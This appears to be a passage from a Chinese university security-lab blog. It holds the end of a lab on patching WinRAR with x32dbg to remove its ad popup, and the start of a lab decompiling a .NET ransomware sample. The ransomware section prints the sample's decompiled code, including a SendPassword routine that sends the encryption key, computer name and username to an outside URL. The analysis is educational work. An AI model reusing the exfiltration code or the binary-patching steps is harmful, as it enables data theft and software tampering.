添加API断点调试，查找广告弹窗代码。"></a>4.   添加API断点调试，查找广告弹窗代码。</h4><h5 id="4-1-添加API断点"><a href="#4-1-添加API断点" class="headerlink" title="4.1 添加API断点"></a>4.1 添加API断点</h5><p>​        使用x32dbg添加API断点可以使用以下2种方式，可以选择其中任意一种方式：</p><p>​        （1）在符号窗口中右键单击查找到的API，如图 3界面中在CreateWindowExW单击右键，在菜单中选择“切换断点”或者使用F2快捷键添加API断点。</p><p>​        （2）在x32dbg界面底部的<strong>命令</strong>窗口输入命令添加断点。</p><p>​        添加断点可以使用SetBPX, bp和bpx三个命令，这里以bpx为例介绍基本用法。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">bpx &lt;<span class="hljs-selector-tag">Address</span>/API&gt; <span class="hljs-selector-attr">[bpName]</span> <span class="hljs-selector-attr">[bpType]</span><br></code></pre></td></tr></table></figure><p>参数：</p><ul><li><p>Address&#x2F;API：断点的地址或者API名称</p></li><li><p>bpName：可选参数，用于标记断点名称</p></li><li><p>bpType：可选参数，标记断点类型，可使用ss，long和ud2三种取值。</p></li></ul><p>​        例如实验中可以使用命令<code>bpx CreateWindowExW</code>添加断点。</p><blockquote><p> 提示：断点添加成功后可以在x32dbg的“断点视图”页面中查看是否正确设置了断点。</p></blockquote><h5 id="4-2-断点调试"><a href="#4-2-断点调试" class="headerlink" title="4.2 断点调试"></a>4.2 断点调试</h5><p>​        添加断点后，使用F9执行代码，当遇到断点触发，调试器会停在断点代码位置。本实验中，加载的断点函数CreateWindowExW是比较常见的Windows API，除了目标代码调用外，还会有很多地方调用，这就需要不断使用F9执行调试，每次触发到断点的代码时候，需要检查是否是查找的广告窗口。</p><p>​        广告窗口具有的特征由Spy++软件获得，包括窗口类名称，窗口样式和窗口句柄等数值。当断点触发的时候，将以上窗口的参数数值和x32dbg寄存器中看到的数值进行对比，x32dbg工具提供了一个单独的窗口显示当前函数调用的参数，如图 4中红色线框区域，如果内部的值和Spy++截获的广告窗口参数一致,就可以确定广告代码了窗口调用。</p><p><img src="http://wxjb.jspi.cn/g/query/4ff1552b-f721-4ceb-afff-df628d5e7caf" alt="函数参数显示区域"></p><center> 图 4 函数参数显示区域 </center><p>​        此时蓝色线框区域显示的就是CreateWindowExW函数执行的汇编代码，在此函数中找到RET指令，双击就能显示调用此函数的代码，即这里需要查找的新建广告窗口的代码位置，如图 5所示中第3行代码。</p><p><img src="http://wxjb.jspi.cn/g/query/6ee152d5-a559-4870-90e9-6d24c250d944" alt="启动广告窗口CreateWindowExW代码"></p><center> 图 5 启动广告窗口CreateWindowExW代码</center><p>​        这里请同学们思考，以上是通过多次执行F9，利用断点使程序停止后，人工检查断点是否是我们需要查找的位置，有没有办法让调试器自动查找这个位置？这个问题也是实验最后的思考题，请大家结合条件断点设置分析（提示：条件断点）。</p><h4 id="5-修改并制作补丁"><a href="#5-修改并制作补丁" class="headerlink" title="5.   修改并制作补丁"></a>5.   修改并制作补丁</h4><p>​        通过前面的分析，可以找到广告窗口的启动代码。本实验的初衷是去除这个令人厌烦的广告窗口的出现，最彻底的方式就是将这部分的代码完全清除。但现实工作中，在汇编级别对代码进行修改是复杂的，也很难完全在编译好的二进制文件中进行这种操作，因此通常的做法是使用<code>JMP</code>指令绕开不需要执行的代码，或者使用<code>NOP</code>空指令替换不需要执行的指令。<br>​       查阅资料对CreateWindowExW函数进行了分析可知，其调用需要使用12个参数，从反汇编代码中反映就是在CreateWindowExW函数调用前的12个PUSH语句，用于传输并设置这12个参数。因此从传递参数的PUSH指令到Call CreateWindowExW指令，屏蔽这中间的13条语句就能禁止广告窗口代码的执行。（这就是说修改指令执行，不去Create广告窗口，自然就没有广告弹窗出现了。）<br>​        具体方法可以在第一条PUSH命令修改为JMP指令，使得代码运行到这类的时候会跳转到第13条指令后面的一条指令的地址，这样就能绕过广告窗口的执行。<strong>修改方法可以通过单击空格键，在弹出汇编窗口中输入修改后的汇编指令代码（JMP指令后面跟上的是Call CreateWindowExW函数后面一条指令的地址），如图 6所示。</strong></p><blockquote><p>注意：汇编代码必须选择正确的编码引擎后，右下脚显示绿色“指令编码成功”字样才有效。</p></blockquote><p><img src="http://wxjb.jspi.cn/g/query/bb15f84c-7c4b-440a-832e-aba0da61607e" alt="JMP修改替换指令"></p><center> 图 6 JMP修改替换指令</center><h4 id="6-制作补丁，持久化保存PE可执行文件"><a href="#6-制作补丁，持久化保存PE可执行文件" class="headerlink" title="6.   制作补丁，持久化保存PE可执行文件"></a>6.   制作补丁，持久化保存PE可执行文件</h4><p>​        通过以上的汇编指令修改只更改了PE文件加载到内存中的机器指令，并没有修改可执行PE文件。如果需要在修改PE文件，需要使用二进制文件编辑器修改，如HxD等软件编辑。HxD等文件编辑器打开PE文件后，采用的是文件偏移地址，和调试器中使用的虚拟地址不同，需要将以上调试的内存地址映射到文件偏移地址。</p><p>​         地址转换公式：<code>文件偏移地址=RVA+PointerToRawData-VirtualAddress</code></p><p><img src="http://wxjb.jspi.cn/g/query/d62455fb-ade2-48ac-957b-8665b0528f52" alt="PE文件节表"></p><center> 图 7 PE文件节表</center><p>​        以上公式中，RVA是相对虚拟地址，即指令在内存中的地址减去PE文件加载到内存中的起始地址（通常是PE头部中ImageBase字段值，但如果冲突可能会加载到其他位置！）。PointerToRawData和VirtualAddress分别是PE文件的节表（如图 7）中的两列数据，分别表示具体某一个“节”分别在文件和内存中的相对位置，因此在使用以上公式前，应确认需要计算的地址在哪个节中。另外需要注意的是以上节表中数据都是相对数据，即相对文件加载到内存或文件头的位置，其中VirtualAddress一列数据起始也是相对地址RVA，而不是通常内存分析中提到的虚拟地址。<br>​        x32dbg工具在汇编窗口中，对需要查看的指令单击右键，在弹出的右键菜单中，可以方便的获得虚拟地址，RVA，文件偏移地址等信息，给实际工作提高了效率，但本实验中，请同学们使用以上的信息和公式计算并验证文件偏移地址和内存虚拟地址之间的转换。</p><p>​        以上是在使用HxD这类底层二进制文件编辑工具的修改方法，不过由于其操作繁琐效率低下，本次实验使用x64dbg套件中的补丁功能一键完成。    </p><p><img src="http://wxjb.jspi.cn/g/query/b4896737-f078-4c2c-a89a-8ef9ccde218d" alt="补丁窗口"></p><center> 图 8 补丁窗口</center><p>​        x64dbg工具提供了补丁功能，单击工具栏中的<strong>补丁</strong>按钮就能弹出图 8所示的补丁保存窗口，单击“修补文件”按钮就能方便将修改过的内存中的文件镜像保存到PE文件中。实验中可以保存在Winrar.exe相同的文件夹中，并使用Winrar1.exe。</p><h3 id="五、测试："><a href="#五、测试：" class="headerlink" title="五、测试："></a>五、测试：</h3><p>​        双击执行Winrar1.exe，可以发现程序正常启动已经不会出现广告窗口了，达到修改目标。如果出现程序报错等意外情况，说明前面的操作中有误，可以尝试重新做一次。</p><h3 id="六、实验结果："><a href="#六、实验结果：" class="headerlink" title="六、实验结果："></a>六、实验结果：</h3><ol><li>广告窗口新建指令地址，即CreateWindowEx指令地址：(             )。</li><li>.text节VirtualAddress地址：(         )。</li><li>如果实验中使用HxD等二进制文件编辑器修改，需要打开文件后在文件偏移位置为(          )的地方，修改数据为（           ）。</li></ol><h3 id="七、思考题："><a href="#七、思考题：" class="headerlink" title="七、思考题："></a>七、思考题：</h3><ol><li>是否可以使用条件断点，通过限制断点触发条件，更高效率的捕获到需要的代码位置？提示，请参考附处理器与函数参数调用关系。</li><li>如果不使用JMP指令，使用NOP空指令填充方式修改应该如何操作。</li><li>如果不是用x64dbg工具中的补丁功能，如何直接EXE修改文件，如使用HxD修改。</li><li>使用x64dbg，修改<a href="https://www.winrar.com.cn/">https://www.winrar.com.cn/</a> 上最新版本的Winrar软件（64位）。</li></ol><blockquote><p>附：CreateWindowExW函数参考</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt;HWND <span class="hljs-title function_">CreateWindowExW</span><span class="hljs-params">(</span><br><span class="hljs-params">   DWORD   dwExStyle,</span><br><span class="hljs-params">   LPCWSTR  lpClassName,   <span class="hljs-comment">//窗口类名称</span></span><br><span class="hljs-params">   LPCWSTR  lpWindowName,  <span class="hljs-comment">//窗口名称</span></span><br><span class="hljs-params">   DWORD   dwStyle,     <span class="hljs-comment">//窗口样式</span></span><br><span class="hljs-params">   <span class="hljs-type">int</span>    X,</span><br><span class="hljs-params">   <span class="hljs-type">int</span>    Y,</span><br><span class="hljs-params">   <span class="hljs-type">int</span>    nWidth,</span><br><span class="hljs-params">   <span class="hljs-type">int</span>    nHeight,</span><br><span class="hljs-params">   HWND   hWndParent,</span><br><span class="hljs-params">   HMENU   hMenu,</span><br><span class="hljs-params">   HINSTANCE hInstance,</span><br><span class="hljs-params">   LPVOID  lpParam</span><br><span class="hljs-params">&gt;)</span>;<br></code></pre></td></tr></table></figure><p>完整参考：<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-createwindowexw">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-createwindowexw</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>勒索病毒程序分析</title>
    <link href="/2024/10/24/111/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    <url>/2024/10/24/111/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="实验：勒索病毒程序分析"><a href="#实验：勒索病毒程序分析" class="headerlink" title="实验：勒索病毒程序分析"></a>实验：勒索病毒程序分析</h1><h2 id="1-实验目的："><a href="#1-实验目的：" class="headerlink" title="1. 实验目的："></a>1. 实验目的：</h2><ol><li><p>掌握.Net程序逆向分析方法</p></li><li><p>通过真实案例了勒索病毒程序的一般工作原理和关键技术</p></li></ol><h2 id="2-实验环境："><a href="#2-实验环境：" class="headerlink" title="2. 实验环境："></a>2. 实验环境：</h2><p>操作系统：Windows 7&#x2F;8&#x2F;10</p><p>实验对象：某勒索软件程序</p><p>实验软件：Detect It Easy，ILSpy</p><h2 id="3-实验内容："><a href="#3-实验内容：" class="headerlink" title="3. 实验内容："></a>3. 实验内容：</h2><h3 id="3-1-实验背景"><a href="#3-1-实验背景" class="headerlink" title="3.1 实验背景"></a>3.1 实验背景</h3><p>勒索型恶意代码是一种以勒索为目的的恶意软件——黑客使用技术手段劫持用户设备或数据资产，并以此为条件向用户勒索钱财的一种恶意攻击手段。</p><p>典型的勒索型恶意代码一般会通过绑架用户文件等方式，使用户数据资产或计算资源无法正常使用，并以此为条件向用户骚扰恐吓，最终达到勒索钱财的目的。这类用户数据资产包括文档、邮件、数据库、源代码、图片、压缩文件等多种文件，赎金形式包据真实货币、比特币或其他虚拟货币等。</p><h3 id="3-2-实验内容概述"><a href="#3-2-实验内容概述" class="headerlink" title="3.2 实验内容概述"></a>3.2 实验内容概述</h3><p>待分析样本文件是某款勒索软件活体样本，具有执行和感染的风险，请同学们在实验分析时候做好实验环境的隔离措施。</p><p>本次实验内容是通过使用Detect It Easy ，dnSpy和iLSpy等分析软件，对分析样本进行分析，通过对反编译工具还原C#语言编写的勒索软件，对其中的核心代码进行阅读和分析，了解其功能。通过实际勒索软件的分析进一步加深相关理论和概念的理解。 </p><h2 id="4-实验步骤："><a href="#4-实验步骤：" class="headerlink" title="4. 实验步骤："></a>4. 实验步骤：</h2><h3 id="4-1-样本文件类型及其基本信息搜集。"><a href="#4-1-样本文件类型及其基本信息搜集。" class="headerlink" title="4.1 样本文件类型及其基本信息搜集。"></a>4.1 样本文件类型及其基本信息搜集。</h3><p>在进一步对样本程序分析前，必须首先确定样本文件的一些基本信息，如文件类型，可执行类别，是Win32 PE可执行文件还是dot net可执行文件，或者是java语言编写的jar程序包。此外对文件编译的编译器的确定也有利于下一步的分析工具的选择，因此分析的第一步通常是确定文件的相关信息。</p><p>目前使用比较多的是Detect It Easy工具，该工具能获得大多数分析工作中需要的基本信息。</p><p><img src="http://wxjb.jspi.cn/g/query/265d14b0-c3fa-4d4a-9940-2e3f24cf84eb" alt="图 1 Detect It Easy分析"></p><center>图 1 Detect It Easy分析</center><p>如图 1所示的Die软件的界面中显示了本次实验需要分析的样本文件的基本信息，其中可以从程序的主界面直观的观察到样本程序是.net可执行程序。</p><p>在.NET环境中的字节代码程序，这使得采用ILSpy等逆向分析工具能方便的还原显示开发过程的原始代码，这为人工分析恶意代码提供了一定的便利。</p><h3 id="4-2-静态分析"><a href="#4-2-静态分析" class="headerlink" title="4.2 静态分析"></a>4.2 静态分析</h3><p>样本文件采用C#语言开发，因此通常会首先尝试使用ILSpy或.NET Reflector等工具对样本文件进行源码基本的逆向分析。使用反编译工具直接从可执行文件逆向获得开发编写的程序语言代码，并进行分析的方式，通常称为静态分析，通过对源代码或者伪代码进行分析，可以准确的了解程序功能。</p><p>静态分析的主要优点是在病毒或恶意代码不执行的条件下，能对其进行分析，但是其不足之处也是显而易见的，就是对于比较复杂的程序人工分析的工作量较大，程序分支结构复杂而无法人工分析。</p><p><img src="http://wxjb.jspi.cn/g/query/6d941f5d-fce5-4aff-bbff-e16df2372ced" alt="图 2 使用ILSpy查看.NET程序集文件"></p><center>图 2 使用ILSpy查看.NET程序集文件</center><p>ILSpy软件的使用方式比较简单，打开软件后，直接将需要分析的程序集（exe文件）拖进程序窗口中，在左侧的导航窗格中找到，逐级展开其中的树形结构，单击需要查看的节点，在窗口右侧就会显示出对应的代码，如图 2是使用ILSpy打开实验样本程序的效果。</p><p><img src="http://wxjb.jspi.cn/g/query/3aa80771-cd8b-4451-8d71-17f561fc46c0" alt="图 3 样本程序结构树形显示（ILSpy左侧导航窗格）"></p><center>图 3 样本程序结构树形显示（ILSpy左侧导航窗格）</center><p>打开样本分析程序后，可以看到程序资源文件和blocky命名空间，其中包含了Form1和Program两个类的代码。如图 3中所示。这些都符合常规WinForm程序的代码结构，可以初步判断是一个具有单一窗口的WinForm应用程序。</p><p>单击Program类图标，可以在右侧的代码窗口中看到代码如下。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-keyword">internal</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span> &#123;<br><span class="hljs-number">02</span>     [STAThread]<br><span class="hljs-number">03</span>     <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>()</span> &#123;<br><span class="hljs-number">04</span>         Application.EnableVisualStyles();<br><span class="hljs-number">05</span>         Application.SetCompatibleTextRenderingDefault(defaultValue: <span class="hljs-literal">false</span>);<br><span class="hljs-number">06</span>         Application.Run(<span class="hljs-keyword">new</span> Form1());  <span class="hljs-comment">// &lt;--这里程序启动Form1窗口</span><br><span class="hljs-number">07</span>     &#125;<br><span class="hljs-number">08</span> &#125;<br><br></code></pre></td></tr></table></figure><p>以上代码中，可以确定程序启动后的主窗口程序是Form1，单击Form1图标继续查看相关代码。</p><p><img src="http://wxjb.jspi.cn/g/query/39b15c96-5cf0-4d2c-81b4-7df36416c0b8" alt="图 4 Form1代码"></p><center>图 4 Form1代码</center><p>这里对Windows Form程序代码做以下简单说明：</p><p>（1）Form1及其成员变量。</p><p>Form1是从Form类继承而来的，Form类是Windows Form程序中标准窗口类，窗口中的一些控件，例如Button，PictureBox等都可以定义成类中的成员变量，可以在类中的方法中调用。</p><p>（2）Form1的构造函数及成员方法</p><p>在面向对象程序设计语言中，通常一个类会有和其类目同名的构造函数或构造方法，这里Form1()就是Form1类的构造函数，当新建一个Form1对象时，构造函数将会自动执行。展开Form1()构造函数可以发现，其代码是调用了InitializeComponent方法，代码如下：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">InitializeComponent</span>()</span> &#123;<br><span class="hljs-number">02</span>     pictureBox1 = <span class="hljs-keyword">new</span> System.Windows.Forms.PictureBox();<br><span class="hljs-number">03</span>     ((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();<br><span class="hljs-number">04</span>     SuspendLayout();<br><span class="hljs-number">05</span>     pictureBox1.Location = <span class="hljs-keyword">new</span> System.Drawing.Point(<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-number">06</span>     pictureBox1.Name = <span class="hljs-string">&quot;pictureBox1&quot;</span>;<br><span class="hljs-number">07</span>     pictureBox1.Size = <span class="hljs-keyword">new</span> System.Drawing.Size(<span class="hljs-number">805</span>, <span class="hljs-number">450</span>);<br><span class="hljs-number">08</span>     pictureBox1.TabIndex = <span class="hljs-number">0</span>;<br><span class="hljs-number">09</span>     pictureBox1.TabStop = <span class="hljs-literal">false</span>;<br><span class="hljs-number">10</span>     <span class="hljs-keyword">base</span>.AutoScaleDimensions = <span class="hljs-keyword">new</span> System.Drawing.SizeF(<span class="hljs-number">6f</span>, <span class="hljs-number">13f</span>);<br><span class="hljs-number">11</span>     <span class="hljs-keyword">base</span>.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;<br><span class="hljs-number">12</span>     <span class="hljs-keyword">base</span>.ClientSize = <span class="hljs-keyword">new</span> System.Drawing.Size(<span class="hljs-number">800</span>, <span class="hljs-number">450</span>);<br><span class="hljs-number">13</span>     <span class="hljs-keyword">base</span>.Controls.Add(pictureBox1);<br><span class="hljs-number">14</span>     <span class="hljs-keyword">base</span>.Name = <span class="hljs-string">&quot;Form1&quot;</span>;<br><span class="hljs-number">15</span>     Text = <span class="hljs-string">&quot;Form1&quot;</span>;<br><span class="hljs-number">16</span>     <span class="hljs-keyword">base</span>.Load += <span class="hljs-keyword">new</span> System.EventHandler(Form1_Load);<br><span class="hljs-number">17</span>     ((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();<br><span class="hljs-number">18</span>     ResumeLayout(<span class="hljs-literal">false</span>);<br><span class="hljs-number">19</span> &#125;<br><br></code></pre></td></tr></table></figure><p>以上代码中主要是初始化了一个图片控件，其中第16行代码是增加了一个Load事件绑定，表面当窗体加载完毕后的执行代码。</p><p>在如图 3的代码树窗体中，单击Form1_Load，可以查看到如下代码。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-keyword">using</span> System;<br><span class="hljs-number">02</span> <br><span class="hljs-number">03</span> <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Form1_Load</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sender, EventArgs e</span>)</span> &#123;<br><span class="hljs-number">04</span>     <span class="hljs-keyword">base</span>.Opacity = <span class="hljs-number">0.0</span>;<br><span class="hljs-number">05</span>     <span class="hljs-keyword">base</span>.ShowInTaskbar = <span class="hljs-literal">false</span>;<br><span class="hljs-number">06</span>     startAction();  <span class="hljs-comment">// &lt;--窗体加载后将自动执行</span><br><span class="hljs-number">07</span> &#125;<br><br></code></pre></td></tr></table></figure><p>以上代码中，主要是加载了startAction方法，使用鼠标单击startAction方法，就可以直接查看其中代码。 </p><h3 id="4-3-主体代码分析"><a href="#4-3-主体代码分析" class="headerlink" title="4.3 主体代码分析"></a>4.3 主体代码分析</h3><p>startAction方法是恶意代码行为调用的父方法，具有破坏的恶意代码均由其调用，使用ILSpy可以查看代码如下：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">startAction</span>()</span> &#123;<br><span class="hljs-number">02</span>     MoveVirus();<br><span class="hljs-number">03</span>     <span class="hljs-built_in">string</span> password = CreatePassword(<span class="hljs-number">15</span>);<br><span class="hljs-number">04</span>     Directory_Settings_Sending(password);<br><span class="hljs-number">05</span>     messageCreator();<br><span class="hljs-number">06</span>     <span class="hljs-built_in">string</span> path = userDir + userName + <span class="hljs-string">&quot;\\ransom.bmp&quot;</span>;<br><span class="hljs-number">07</span>     <span class="hljs-built_in">bool</span> flag;<br><span class="hljs-number">08</span>     <span class="hljs-keyword">do</span> &#123;<br><span class="hljs-number">09</span>         flag = CheckForInternetConnection();<br><span class="hljs-number">10</span>         <span class="hljs-keyword">if</span> (flag) &#123;<br><span class="hljs-number">11</span>             CreateWallpaper(path);<br><span class="hljs-number">12</span>             SendPassword(password);<br><span class="hljs-number">13</span>         &#125;<br><span class="hljs-number">14</span>     &#125; <span class="hljs-keyword">while</span> (!flag);<br><span class="hljs-number">15</span>     password = <span class="hljs-literal">null</span>;<br><span class="hljs-number">16</span>     Application.Exit();<br><span class="hljs-number">17</span> &#125;<br><br></code></pre></td></tr></table></figure><p>startAction方法被程序的初始化代码调用后，startAction中分别调用CreateWallpaper，MoveVirus，SendPassword，Directory_Settinys_Sending和CreatePassword等方法，实现对用户文件的加密，显示勒索信息，发送加密密码等行为，其主要方法之间调用关系如图 5所示。</p><p><img src="http://wxjb.jspi.cn/g/query/fe53b8fd-4856-4bd3-a3aa-662e542cea5c" alt="图 5 核心代码调用关系图"></p><center>图 5 核心代码调用关系图</center><p>从startAction代码和调用关系图中，可以直观的推测恶意代码的整体思路如下：</p><ul><li><p>病毒代码进行自我复制保存</p></li><li><p>病毒创建加密使用的密钥</p></li><li><p>病毒使用创建的密钥对主机中的文件进行加密</p></li><li><p>检测互联网状态，并在联网状态，将加密的密钥发送出去</p></li><li><p>创建勒索信息图片并显示给用户进行勒索</p></li></ul><p>下面分别对其关键代码进行分析，确认以上的功能</p><h4 id="4-3-1-创建密码"><a href="#4-3-1-创建密码" class="headerlink" title="4.3.1 创建密码"></a>4.3.1 创建密码</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">CreatePassword</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> length</span>)</span> &#123;<br><span class="hljs-number">02</span>     StringBuilder stringBuilder = <span class="hljs-keyword">new</span> StringBuilder();<br><span class="hljs-number">03</span>     Random random = <span class="hljs-keyword">new</span> Random();<br><span class="hljs-number">04</span>     <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span> &lt; length--) &#123;<br><span class="hljs-number">05</span>         stringBuilder.Append(<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()&quot;</span>[random.Next(<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()&quot;</span>.Length)]);<br><span class="hljs-number">06</span>     &#125;<br><span class="hljs-number">07</span>     <span class="hljs-keyword">return</span> stringBuilder.ToString();<br><span class="hljs-number">08</span> &#125;<br><br></code></pre></td></tr></table></figure><p>以上代码使用给定的字母表，通过系统的random随机函数，构造出一个长度为length的随机密码。</p><h4 id="4-3-2-发送密码"><a href="#4-3-2-发送密码" class="headerlink" title="4.3.2 发送密码"></a>4.3.2 发送密码</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SendPassword</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> password</span>)</span> &#123;<br><span class="hljs-number">02</span>     <span class="hljs-keyword">try</span> &#123;<br><span class="hljs-number">03</span>         <span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;?computer_name=&quot;</span> + computerName + <span class="hljs-string">&quot;&amp;userName=&quot;</span> + userName + <span class="hljs-string">&quot;&amp;password=&quot;</span> + password + <span class="hljs-string">&quot;&amp;allow=ransom&quot;</span>;<br><span class="hljs-number">04</span>         <span class="hljs-built_in">string</span> address = targetURL + str;<br><span class="hljs-number">05</span>         <span class="hljs-built_in">string</span> text = <span class="hljs-keyword">new</span> WebClient().DownloadString(address);<br><span class="hljs-number">06</span>     &#125; <span class="hljs-keyword">catch</span> (Exception) &#123;<br><span class="hljs-number">07</span>     &#125;<br><span class="hljs-number">08</span> &#125;<br><br></code></pre></td></tr></table></figure><p>以上代码中，使用了WebClinet的DownloadSting方法想给定的互联网地址发送了GET请求，将密码，主机名和用户密码发送给网址<a href="http://rose-flowers.epizy.com/write.php">http://rose-flowers.epizy.com/write.php</a></p><p>这里请大家思考，为什么除了发送密码，恶意代码还发送了主机名和用户名等信息。</p><h4 id="4-3-3-目录扫描加密"><a href="#4-3-3-目录扫描加密" class="headerlink" title="4.3.3 目录扫描加密"></a>4.3.3 目录扫描加密</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br><span class="hljs-number">01</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Directory_Settings_Sending</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> password</span>)</span> &#123;<br><span class="hljs-number">02</span>     <span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Users\\&quot;</span>;<br><span class="hljs-number">03</span>     <span class="hljs-built_in">string</span> location = userDir + str + userName + <span class="hljs-string">&quot;\\Desktop&quot;</span>;<br><span class="hljs-number">04</span>     <span class="hljs-built_in">string</span> location2 = userDir + str + userName + <span class="hljs-string">&quot;\\Links&quot;</span>;<br><span class="hljs-number">05</span>     <span class="hljs-built_in">string</span> location3 = userDir + str + userName + <span class="hljs-string">&quot;\\Contacts&quot;</span>;<br><span class="hljs-number">06</span>     <span class="hljs-built_in">string</span> location4 = userDir + str + userName + <span class="hljs-string">&quot;\\Desktop&quot;</span>;<br><span class="hljs-number">07</span>     <span class="hljs-built_in">string</span> location5 = userDir + str + userName + <span class="hljs-string">&quot;\\Documents&quot;</span>;<br><span class="hljs-number">08</span>     <span class="hljs-built_in">string</span> location6 = userDir + str + userName + <span class="hljs-string">&quot;\\Downloads&quot;</span>;<br><span class="hljs-number">09</span>     <span class="hljs-built_in">string</span> location7 = userDir + str + userName + <span class="hljs-string">&quot;\\Pictures&quot;</span>;<br><span class="hljs-number">10</span>     <span class="hljs-built_in">string</span> location8 = userDir + str + userName + <span class="hljs-string">&quot;\\Music&quot;</span>;<br><span class="hljs-number">11</span>     <span class="hljs-built_in">string</span> location9 = userDir + str + userName + <span class="hljs-string">&quot;\\OneDrive&quot;</span>;<br><span class="hljs-number">12</span>     <span class="hljs-built_in">string</span> location10 = userDir + str + userName + <span class="hljs-string">&quot;\\Saved Games&quot;</span>;<br><span class="hljs-number">13</span>     <span class="hljs-built_in">string</span> location11 